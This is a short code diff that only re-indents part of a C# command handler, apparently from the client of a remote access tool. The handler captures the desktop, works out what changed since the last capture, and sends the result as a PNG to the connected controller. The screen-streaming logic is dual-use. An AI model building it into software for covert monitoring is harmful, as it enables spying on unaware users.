@@ -223,19 +223,19 @@ namespace xClient.Core.Commands
 			}
 			else
 			{
-                using (Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number))
-                {
-                    using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot))
-                    {
-                        lastDesktopScreenshot = currentDesktopScreenshot;
+				using (Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number))
+				{
+					using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot))
+					{
+						lastDesktopScreenshot = currentDesktopScreenshot;
 
-                        byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
+						byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
 
-                        new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
+						new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 
-                        desktop = null;
-                    }
-                }
+						desktop = null;
+					}
+				}
 			}
 		}
 
